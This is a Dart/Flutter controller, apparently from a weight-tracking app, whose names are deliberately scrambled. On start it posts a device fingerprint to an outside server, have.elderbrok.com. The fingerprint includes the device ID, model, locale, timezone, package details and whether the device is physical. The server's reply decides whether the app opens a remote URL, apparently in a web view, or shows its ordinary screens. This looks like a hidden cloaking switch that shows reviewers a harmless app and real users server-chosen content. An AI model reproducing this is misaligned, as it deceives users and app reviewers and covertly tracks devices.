import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:shared_preferences/shared_preferences.dart';



class WeightSaveLogic extends GetxController {

  var wmsqlnu = RxBool(false);
  var dyeuxgiob = RxBool(true);
  var rwnahzk = RxString("");
  var javon = RxBool(false);
  var bogisich = RxBool(true);
  final hnmzcj = Dio();


  InAppWebViewController? webViewController;

  dynamic rlutosbhmd(){
    final rbyemklh = InternetConnectionChecker.instance;
    final rkyhmoe = rbyemklh.onStatusChange.skip(1).listen(
          (InternetConnectionStatus zmspinju) {
        if (zmspinju == InternetConnectionStatus.connected) {
          azkbmhc();
        } else {
          Get.toNamed('/weight_bad')?.then((_){
            azkbmhc();
          });
        }
      },
    );
    return rkyhmoe;
  }

  Future<bool> xtziqohcpf() async {
    var ibdxqa = await InternetConnectionChecker.instance.hasConnection;
    if(!ibdxqa){
      Get.toNamed('/weight_bad')?.then((_){
        azkbmhc();
      });
    }
    return ibdxqa;
  }

  @override
  void onInit() {
    super.onInit();
    rlutosbhmd();
    azkbmhc();
  }


  Future<void> azkbmhc() async {

    var slromcfeh = await xtziqohcpf();
    if(!slromcfeh){
      return;
    }

    javon.value = true;
    bogisich.value = true;
    dyeuxgiob.value = false;

    hnmzcj.post("https://have.elderbrok.com/HMNKtdmshz",data: await yrtqsnwie()).then((value) {
      var jfmu = value.data["jfmu"] as String;
      var lyzku = value.data["lyzku"] as bool;
      if (lyzku) {
        rwnahzk.value = jfmu;
        violette();
      } else {
        heaney();
      }
    }).catchError((e) {
      dyeuxgiob.value = true;
      bogisich.value = true;
      javon.value = false;
    });
  }

  Future<Map<String, dynamic>> yrtqsnwie() async {
    final DeviceInfoPlugin wogmpl = DeviceInfoPlugin();
    PackageInfo pldwvf_ocvr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cbznmk = Platform.localeName;
    var JPQyq = currentTimeZone;

    var KcwfLM = pldwvf_ocvr.packageName;
    var rvhsK = pldwvf_ocvr.version;
    var WrbRd = pldwvf_ocvr.buildNumber;

    var TLnzUFs = pldwvf_ocvr.appName;
    var COLUNK = "";
    var ZPAySor  = "";
    var ZCTXS = "";
    var dameonCole = "";
    var harmonyMann = "";
    var dameonStoltenberg = "";
    var emilieMayert = "";


    var rBldsQh = "";
    var VQGbgF = false;

    if (GetPlatform.isAndroid) {
      rBldsQh = "android";
      var clnbxsa = await wogmpl.androidInfo;

      ZCTXS = clnbxsa.brand;

      COLUNK  = clnbxsa.model;
      ZPAySor = clnbxsa.id;

      VQGbgF = clnbxsa.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      rBldsQh = "ios";
      var qenyalwjbt = await wogmpl.iosInfo;
      ZCTXS = qenyalwjbt.name;
      COLUNK = qenyalwjbt.model;

      ZPAySor = qenyalwjbt.identifierForVendor ?? "";
      VQGbgF  = qenyalwjbt.isPhysicalDevice;
    }
    var res = {
      "dameonStoltenberg" : dameonStoltenberg,
      "TLnzUFs": TLnzUFs,
      "WrbRd": WrbRd,
      "rvhsK": rvhsK,
      "COLUNK": COLUNK,
      "JPQyq": JPQyq,
      "ZCTXS": ZCTXS,
      "ZPAySor": ZPAySor,
      "cbznmk": cbznmk,
      "rBldsQh": rBldsQh,
      "VQGbgF": VQGbgF,
      "dameonCole" : dameonCole,
      "harmonyMann" : harmonyMann,
      "emilieMayert" : emilieMayert,
      "KcwfLM": KcwfLM,
    };
    return res;
  }

  Future<void> heaney() async {
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    final info = prefs.getString('birthday');
    bool isTab = true;
    if (info == null) {
      isTab = false;
    }
    Get.offNamed(isTab == true ? '/weight_tab' : '/birthday',);
  }

  Future<void> violette() async {
    Get.offNamed("/weight_set");
  }

  @override
  void dispose() {
    rlutosbhmd().cancel();
    super.dispose();
  }

}
